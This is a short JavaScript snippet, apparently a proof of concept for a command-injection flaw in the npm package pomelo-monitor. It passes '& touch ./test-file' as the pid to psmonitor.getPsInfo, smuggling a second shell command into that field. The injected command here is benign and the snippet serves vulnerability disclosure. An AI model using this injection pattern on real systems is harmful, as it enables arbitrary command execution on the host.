var root = require("pomelo-monitor");

try {
    var param = {
        pid: "& touch ./test-file "
    };
    root.psmonitor.getPsInfo(param, function(){});
} catch (e) {}
